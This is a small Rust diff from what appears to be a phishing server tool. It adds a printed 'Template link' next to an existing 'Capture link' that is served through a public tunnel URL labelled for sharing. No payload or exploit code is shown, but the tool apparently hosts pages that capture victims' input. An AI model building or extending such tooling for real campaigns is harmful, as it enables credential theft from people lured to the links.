@@ -984,6 +984,7 @@ impl PhishingServer {
             let url = Self::setup_tunnel(tunnel_type, self.lport);
             if let Some(ref u) = url {
                 banner::success(&format!("Public URL (share this): {}", u));
+                banner::info(&format!("Template link: {}/{}", u, self.template));
                 banner::info(&format!("Capture link: {}/capture", u));
             } else {
                 banner::warning("Tunnel setup failed, using local only");
